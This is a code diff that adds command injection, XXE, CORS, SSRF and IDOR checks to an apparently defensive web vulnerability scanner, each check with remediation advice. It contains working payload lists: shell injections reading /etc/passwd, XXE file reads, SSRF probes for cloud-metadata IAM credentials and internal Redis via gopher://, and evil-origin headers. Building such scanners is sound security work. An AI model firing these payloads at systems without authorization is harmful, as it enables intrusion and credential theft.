@@ -62,6 +62,11 @@ class ScannerEngine:
             TestCategory.CSRF_PROTECTION: self._test_csrf_protection,
             TestCategory.SECURITY_HEADERS: self._test_security_headers,
             TestCategory.SSL_TLS_SECURITY: self._test_ssl_tls,
+            TestCategory.COMMAND_INJECTION: self._test_command_injection,
+            TestCategory.XXE_INJECTION: self._test_xxe_injection,
+            TestCategory.CORS_MISCONFIGURATION: self._test_cors,
+            TestCategory.SSRF: self._test_ssrf,
+            TestCategory.IDOR: self._test_idor,
         }
         fn = category_map.get(category)
         if fn:
@@ -1600,3 +1605,529 @@ def _sqli_recommendation(level) -> Optional[str]:
         "apply least-privilege DB accounts; "
         "enable WAF SQL injection rules"
     )
+
+    # ------------------------------------------------------------------
+    # A03 — OS Command Injection
+    # Injects shell metacharacters into parameters that may reach exec()
+    # ------------------------------------------------------------------
+
+    async def _test_command_injection(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
+        results = []
+
+        payloads = [
+            # Unix command separators
+            "; id", "& id", "| id", "`id`", "$(id)",
+            "; whoami", "& whoami", "| whoami",
+            "; cat /etc/passwd", "| cat /etc/passwd",
+            "; ls -la", "& ls -la",
+            # Time-based blind (sleep)
+            "; sleep 5", "& sleep 5", "| sleep 5",
+            "$(sleep 5)", "`sleep 5`",
+            # Windows
+            "& whoami", "| whoami", "& dir", "| dir",
+            "& type C:\\windows\\win.ini",
+            # Encoded
+            "%3B id", "%7C id", "%26 id",
+            "%0a id", "%0d%0a id",
+            # Nested
+            "$($(id))", "`$(id)`",
+        ]
+
+        targets = [
+            ("/api/ping/",    "host",    "GET",  "query"),
+            ("/api/lookup/",  "domain",  "GET",  "query"),
+            ("/api/resolve/", "host",    "GET",  "query"),
+            ("/api/exec/",    "cmd",     "GET",  "query"),
+            ("/api/run/",     "command", "POST", "json"),
+            ("/api/convert/", "file",    "POST", "json"),
+            ("/api/export/",  "format",  "GET",  "query"),
+        ]
+
+        ic = config.get_intensity_config()
+        if ic["max_payloads"]:
+            payloads = payloads[: ic["max_payloads"]]
+
+        async with SecurityHTTPClient(config) as client:
+            for endpoint, field, method, inject_as in targets:
+                for payload in payloads:
+                    test_id = f"{scan_id}-cmdi-{hash(endpoint + field + payload)}"
+                    resp = None
+                    elapsed = 0.0
+                    t0 = time.time()
+                    try:
+                        resp = await client.make_async_request(
+                            method, endpoint, payload,
+                            inject_as=inject_as, field_name=field,
+                        )
+                        elapsed = time.time() - t0
+                        code = getattr(resp, "status", 0)
+                        body = getattr(resp, "text_content", "").lower()
+
+                        if code == 403 or "blocked" in body or "waf" in body:
+                            status = TestStatus.BLOCKED
+                            level = None
+                            details = "Command injection attempt blocked"
+                        elif any(i in body for i in [
+                            "uid=", "root:", "www-data", "daemon:",
+                            "bin/bash", "bin/sh", "/etc/passwd",
+                            "volume serial", "directory of",
+                            "windows ip configuration",
+                        ]):
+                            status = TestStatus.VULNERABLE
+                            level = VulnerabilityLevel.CRITICAL
+                            details = f"OS command injection confirmed — shell output in response: {payload[:50]}"
+                        elif "sleep" in payload.lower() and elapsed >= 4.5:
+                            status = TestStatus.VULNERABLE
+                            level = VulnerabilityLevel.HIGH
+                            details = f"Blind command injection — response delayed {elapsed:.1f}s: {payload[:50]}"
+                        elif code == 500:
+                            status = TestStatus.VULNERABLE
+                            level = VulnerabilityLevel.MEDIUM
+                            details = f"Server error on command injection payload: {payload[:50]}"
+                        else:
+                            status = TestStatus.PASSED
+                            level = None
+                            details = "No command injection indicator detected"
+
+                    except Exception as e:
+                        status, level, details = TestStatus.ERROR, None, str(e)
+
+                    results.append(TestResult(
+                        id=test_id,
+                        category="Command Injection",
+                        test_name=f"CMDi {method} {endpoint} [{field}]",
+                        status=status,
+                        vulnerability_level=level,
+                        target_url=urljoin(config.target_url, endpoint),
+                        method=method,
+                        payload=payload,
+                        response_code=getattr(resp, "status", None),
+                        response_time=elapsed,
+                        service_name="scanner",
+                        details=details,
+                        recommendations="Never pass user input to shell commands; use subprocess with argument lists; whitelist allowed values",
+                    ))
+                    await asyncio.sleep(config.delay)
+
+        return results
+
+    # ------------------------------------------------------------------
+    # A03 — XXE Injection (XML External Entity)
+    # ------------------------------------------------------------------
+
+    async def _test_xxe_injection(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
+        results = []
+
+        xxe_payloads = [
+            # Classic file read
+            ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
+             "Classic XXE /etc/passwd"),
+            ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><x>&xxe;</x>',
+             "Classic XXE /etc/hosts"),
+            ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///windows/win.ini">]><x>&xxe;</x>',
+             "Classic XXE win.ini"),
+            # SSRF via XXE
+            ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&xxe;</x>',
+             "XXE SSRF AWS metadata"),
+            ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://localhost:22/">]><x>&xxe;</x>',
+             "XXE SSRF internal port scan"),
+            # Blind XXE via parameter entity
+            ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><x>test</x>',
+             "Blind XXE parameter entity"),
+            # Billion laughs DoS
+            ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "dos"><!ENTITY b "&a;&a;&a;&a;&a;">]><x>&b;</x>',
+             "XXE Billion Laughs (DoS)"),
+            # XInclude
+            ('<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></x>',
+             "XInclude file read"),
+        ]
+
+        xml_endpoints = [
+            ("/api/xml/",       "POST"),
+            ("/api/import/",    "POST"),
+            ("/api/upload/",    "POST"),
+            ("/api/parse/",     "POST"),
+            ("/api/convert/",   "POST"),
+            ("/api/feed/",      "POST"),
+            ("/api/webhook/",   "POST"),
+            ("/api/soap/",      "POST"),
+        ]
+
+        ic = config.get_intensity_config()
+        if ic["max_payloads"]:
+            xxe_payloads = xxe_payloads[: ic["max_payloads"]]
+
+        async with SecurityHTTPClient(config) as client:
+            for endpoint, method in xml_endpoints:
+                for payload, description in xxe_payloads:
+                    test_id = f"{scan_id}-xxe-{hash(endpoint + description)}"
+                    resp = None
+                    elapsed = 0.0
+                    t0 = time.time()
+                    try:
+                        resp = await client.make_async_request(
+                            method, endpoint,
+                            raw_body=payload.encode(),
+                            headers={"Content-Type": "application/xml"},
+                        )
+                        elapsed = time.time() - t0
+                        code = getattr(resp, "status", 0)
+                        body = getattr(resp, "text_content", "").lower()
+
+                        if code == 403 or "blocked" in body:
+                            status = TestStatus.BLOCKED
+                            level = None
+                            details = f"XXE attempt blocked: {description}"
+                        elif any(i in body for i in [
+                            "root:x:", "daemon:x:", "/bin/bash",
+                            "[boot loader]", "[fonts]",
+                            "ami-id", "instance-id",
+                        ]):
+                            status = TestStatus.VULNERABLE
+                            level = VulnerabilityLevel.CRITICAL
+                            details = f"XXE confirmed — file/SSRF content in response: {description}"
+                        elif code == 404:
+                            status = TestStatus.PASSED
+                            level = None
+                            details = f"XML endpoint not found: {endpoint}"
+                        elif code == 500:
+                            status = TestStatus.VULNERABLE
+                            level = VulnerabilityLevel.MEDIUM
+                            details = f"Server error on XXE payload — possible blind XXE: {description}"
+                        else:
+                            status = TestStatus.PASSED
+                            level = None
+                            details = f"No XXE indicator: {description}"
+
+                    except Exception as e:
+                        status, level, details = TestStatus.ERROR, None, str(e)
+
+                    results.append(TestResult(
+                        id=test_id,
+                        category="XXE Injection",
+                        test_name=f"{description} → {endpoint}",
+                        status=status,
+                        vulnerability_level=level,
+                        target_url=urljoin(config.target_url, endpoint),
+                        method=method,
+                        payload=payload[:100],
+                        response_code=getattr(resp, "status", None),
+                        response_time=elapsed,
+                        service_name="scanner",
+                        details=details,
+                        recommendations="Disable external entity processing in XML parsers; use JSON where possible; validate and sanitize XML input",
+                    ))
+                    await asyncio.sleep(config.delay)
+
+        return results
+
+    # ------------------------------------------------------------------
+    # A05 — CORS Misconfiguration
+    # ------------------------------------------------------------------
+
+    async def _test_cors(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
+        results = []
+
+        evil_origins = [
+            "https://evil.com",
+            "https://attacker.com",
+            "null",
+            "https://evil.binarymisfits.info",  # subdomain of target
+            "https://notbinarymisfits.info",     # typosquat
+            "http://localhost",
+            "https://localhost",
+        ]
+
+        probe_endpoints = [
+            "/api/", "/api/v1/", "/api/users/",
+            "/api/auth/", "/api/admin/", "/",
+        ]
+
+        async with SecurityHTTPClient(config) as client:
+            for endpoint in probe_endpoints:
+                for origin in evil_origins:
+                    test_id = f"{scan_id}-cors-{hash(endpoint + origin)}"
+                    resp = None
+                    elapsed = 0.0
+                    t0 = time.time()
+                    try:
+                        resp = await client.make_async_request(
+                            "GET", endpoint,
+                            headers={"Origin": origin},
+                        )
+                        elapsed = time.time() - t0
+                        h = {k.lower(): v for k, v in getattr(resp, "headers", {}).items()}
+                        acao = h.get("access-control-allow-origin", "")
+                        acac = h.get("access-control-allow-credentials", "").lower()
+
+                        if not acao:
+                            status = TestStatus.PASSED
+                            level = None
+                            details = f"No CORS header returned for origin: {origin}"
+                        elif acao == "*" and acac == "true":
+                            # Browsers block this combo but it's still a misconfiguration
+                            status = TestStatus.VULNERABLE
+                            level = VulnerabilityLevel.HIGH
+                            details = f"CORS wildcard + credentials=true (invalid but misconfigured): {origin}"
+                        elif acao == "*":
+                            status = TestStatus.VULNERABLE
+                            level = VulnerabilityLevel.MEDIUM
+                            details = f"CORS wildcard (*) — any origin allowed on {endpoint}"
+                        elif acao == origin and acac == "true":
+                            status = TestStatus.VULNERABLE
+                            level = VulnerabilityLevel.CRITICAL
+                            details = f"CORS reflects arbitrary origin + credentials=true — cross-origin authenticated requests possible: {origin}"
+                        elif acao == origin:
+                            status = TestStatus.VULNERABLE
+                            level = VulnerabilityLevel.HIGH
+                            details = f"CORS reflects arbitrary origin without validation: {origin}"
+                        elif acao == "null" and origin == "null":
+                            status = TestStatus.VULNERABLE
+                            level = VulnerabilityLevel.HIGH
+                            details = "CORS allows null origin — sandbox iframe attacks possible"
+                        else:
+                            status = TestStatus.PASSED
+                            level = None
+                            details = f"CORS correctly restricted. ACAO: {acao}"
+
+                    except Exception as e:
+                        status, level, details = TestStatus.ERROR, None, str(e)
+
+                    results.append(TestResult(
+                        id=test_id,
+                        category="CORS Misconfiguration",
+                        test_name=f"CORS {endpoint} ← {origin}",
+                        status=status,
+                        vulnerability_level=level,
+                        target_url=urljoin(config.target_url, endpoint),
+                        method="GET",
+                        payload=f"Origin: {origin}",
+                        response_code=getattr(resp, "status", None),
+                        response_time=elapsed,
+                        service_name="scanner",
+                        details=details,
+                        recommendations="Validate Origin against an explicit allowlist; never reflect arbitrary origins; never combine wildcard with credentials=true",
+                    ))
+                    await asyncio.sleep(config.delay)
+
+        return results
+
+    # ------------------------------------------------------------------
+    # A10 — SSRF (Server-Side Request Forgery)
+    # ------------------------------------------------------------------
+
+    async def _test_ssrf(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
+        results = []
+
+        ssrf_payloads = [
+            # Cloud metadata
+            ("http://169.254.169.254/latest/meta-data/",          "AWS IMDSv1 metadata"),
+            ("http://169.254.169.254/latest/meta-data/iam/",      "AWS IAM credentials"),
+            ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
+            ("http://169.254.169.254/metadata/instance",          "Azure IMDS"),
+            ("http://100.100.100.200/latest/meta-data/",          "Alibaba Cloud metadata"),
+            # Internal services
+            ("http://localhost/",                                  "SSRF localhost"),
+            ("http://127.0.0.1/",                                  "SSRF 127.0.0.1"),
+            ("http://0.0.0.0/",                                    "SSRF 0.0.0.0"),
+            ("http://[::1]/",                                      "SSRF IPv6 loopback"),
+            ("http://localhost:22/",                               "SSRF SSH port"),
+            ("http://localhost:3306/",                             "SSRF MySQL port"),
+            ("http://localhost:5432/",                             "SSRF PostgreSQL port"),
+            ("http://localhost:6379/",                             "SSRF Redis port"),
+            ("http://localhost:27017/",                            "SSRF MongoDB port"),
+            ("http://localhost:8080/",                             "SSRF internal HTTP"),
+            # Bypass techniques
+            ("http://2130706433/",                                 "SSRF decimal IP (127.0.0.1)"),
+            ("http://0x7f000001/",                                 "SSRF hex IP (127.0.0.1)"),
+            ("http://127.1/",                                      "SSRF short IP"),
+            ("http://127.0.1/",                                    "SSRF short IP variant"),
+            ("http://[0:0:0:0:0:ffff:127.0.0.1]/",               "SSRF IPv6 mapped"),
+            ("dict://localhost:6379/info",                         "SSRF Redis via dict://"),
+            ("gopher://localhost:6379/_INFO",                      "SSRF Redis via gopher://"),
+            ("file:///etc/passwd",                                 "SSRF file:// protocol"),
+        ]
+
+        # Endpoints that commonly accept URLs as parameters
+        ssrf_targets = [
+            ("/api/fetch/",    "url",      "GET",  "query"),
+            ("/api/proxy/",    "url",      "GET",  "query"),
+            ("/api/request/",  "url",      "GET",  "query"),
+            ("/api/webhook/",  "url",      "POST", "json"),
+            ("/api/import/",   "url",      "POST", "json"),
+            ("/api/preview/",  "url",      "GET",  "query"),
+            ("/api/screenshot/","url",     "GET",  "query"),
+            ("/api/pdf/",      "url",      "POST", "json"),
+            ("/api/redirect/", "url",      "GET",  "query"),
+            ("/api/load/",     "src",      "GET",  "query"),
+            ("/api/image/",    "src",      "GET",  "query"),
+        ]
+
+        ic = config.get_intensity_config()
+        if ic["max_payloads"]:
+            ssrf_payloads = ssrf_payloads[: ic["max_payloads"]]
+
+        async with SecurityHTTPClient(config) as client:
+            for endpoint, field, method, inject_as in ssrf_targets:
+                for ssrf_url, description in ssrf_payloads:
+                    test_id = f"{scan_id}-ssrf-{hash(endpoint + ssrf_url)}"
+                    resp = None
+                    elapsed = 0.0
+                    t0 = time.time()
+                    try:
+                        resp = await client.make_async_request(
+                            method, endpoint, ssrf_url,
+                            inject_as=inject_as, field_name=field,
+                        )
+                        elapsed = time.time() - t0
+                        code = getattr(resp, "status", 0)
+                        body = getattr(resp, "text_content", "").lower()
+
+                        if code == 404:
+                            status = TestStatus.PASSED
+                            level = None
+                            details = f"SSRF endpoint not found: {endpoint}"
+                        elif code == 403 or "blocked" in body:
+                            status = TestStatus.BLOCKED
+                            level = None
+                            details = f"SSRF attempt blocked: {description}"
+                        elif any(i in body for i in [
+                            "ami-id", "instance-id", "local-ipv4",
+                            "iam/security-credentials",
+                            "computemetadata", "metadata.google",
+                            "root:x:", "daemon:x:",
+                            "+ok", "-err",  # Redis
+                            "postgresql", "mysql",
+                        ]):
+                            status = TestStatus.VULNERABLE
+                            level = VulnerabilityLevel.CRITICAL
+                            details = f"SSRF confirmed — internal service response returned: {description}"
+                        elif code == 200 and len(body) > 50:
+                            status = TestStatus.VULNERABLE
+                            level = VulnerabilityLevel.HIGH
+                            details = f"SSRF possible — URL parameter accepted and returned content: {description}"
+                        elif code in (200, 201) and len(body) == 0:
+                            status = TestStatus.VULNERABLE
+                            level = VulnerabilityLevel.MEDIUM
+                            details = f"SSRF possible — URL parameter accepted (blind): {description}"
+                        else:
+                            status = TestStatus.PASSED
+                            level = None
+                            details = f"No SSRF indicator ({code}): {description}"
+
+                    except Exception as e:
+                        status, level, details = TestStatus.ERROR, None, str(e)
+
+                    results.append(TestResult(
+                        id=test_id,
+                        category="SSRF",
+                        test_name=f"{description} → {endpoint}",
+                        status=status,
+                        vulnerability_level=level,
+                        target_url=urljoin(config.target_url, endpoint),
+                        method=method,
+                        payload=ssrf_url,
+                        response_code=getattr(resp, "status", None),
+                        response_time=elapsed,
+                        service_name="scanner",
+                        details=details,
+                        recommendations="Validate and allowlist URLs; block private/loopback ranges; disable unused URL schemes; use a dedicated egress proxy",
+                    ))
+                    await asyncio.sleep(config.delay)
+
+        return results
+
+    # ------------------------------------------------------------------
+    # A01 — IDOR (Insecure Direct Object Reference)
+    # ------------------------------------------------------------------
+
+    async def _test_idor(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
+        results = []
+
+        # Object ID patterns to probe — sequential, UUID, and common values
+        id_values = [
+            "1", "2", "3", "0", "-1", "99999",
+            "00000000-0000-0000-0000-000000000001",
+            "00000000-0000-0000-0000-000000000002",
+            "admin", "root", "system",
+        ]
+
+        idor_endpoints = [
+            ("/api/users/{id}/",          "GET"),
+            ("/api/users/{id}/profile/",  "GET"),
+            ("/api/users/{id}/orders/",   "GET"),
+            ("/api/orders/{id}/",         "GET"),
+            ("/api/invoices/{id}/",       "GET"),
+            ("/api/documents/{id}/",      "GET"),
+            ("/api/files/{id}/",          "GET"),
+            ("/api/messages/{id}/",       "GET"),
+            ("/api/accounts/{id}/",       "GET"),
+            ("/api/admin/users/{id}/",    "GET"),
+        ]
+
+        ic = config.get_intensity_config()
+        if ic["max_payloads"]:
+            id_values = id_values[: ic["max_payloads"]]
+
+        async with SecurityHTTPClient(config) as client:
+            for endpoint_template, method in idor_endpoints:
+                for obj_id in id_values:
+                    endpoint = endpoint_template.replace("{id}", obj_id)
+                    test_id = f"{scan_id}-idor-{hash(endpoint)}"
+                    resp = None
+                    elapsed = 0.0
+                    t0 = time.time()
+                    try:
+                        resp = await client.make_async_request(method, endpoint)
+                        elapsed = time.time() - t0
+                        code = getattr(resp, "status", 0)
+                        body = getattr(resp, "text_content", "").lower()
+
+                        sensitive = any(k in body for k in [
+                            "email", "phone", "address", "password",
+                            "token", "secret", "ssn", "credit_card",
+                            "date_of_birth", "salary",
+                        ])
+
+                        if code in (401, 403):
+                            status = TestStatus.PASSED
+                            level = None
+                            details = f"Access correctly denied ({code}) for object ID: {obj_id}"
+                        elif code == 404:
+                            status = TestStatus.PASSED
+                            level = None
+                            details = f"Object not found (404) for ID: {obj_id}"
+                        elif code == 200 and sensitive:
+                            status = TestStatus.VULNERABLE
+                            level = VulnerabilityLevel.HIGH
+                            details = f"IDOR — sensitive data returned without auth for ID: {obj_id} at {endpoint}"
+                        elif code == 200:
+                            status = TestStatus.VULNERABLE
+                            level = VulnerabilityLevel.MEDIUM
+                            details = f"IDOR possible — object accessible without auth for ID: {obj_id} at {endpoint}"
+                        else:
+                            status = TestStatus.PASSED
+                            level = None
+                            details = f"Response {code} for ID: {obj_id}"
+
+                    except Exception as e:
+                        status, level, details = TestStatus.ERROR, None, str(e)
+
+                    results.append(TestResult(
+                        id=test_id,
+                        category="IDOR",
+                        test_name=f"IDOR {method} {endpoint}",
+                        status=status,
+                        vulnerability_level=level,
+                        target_url=urljoin(config.target_url, endpoint),
+                        method=method,
+                        payload=obj_id,
+                        response_code=getattr(resp, "status", None),
+                        response_time=elapsed,
+                        service_name="scanner",
+                        details=details,
+                        recommendations="Enforce object-level authorization on every endpoint; use indirect references (UUIDs); verify ownership server-side on every request",
+                    ))
+                    await asyncio.sleep(config.delay)
+
+        return results
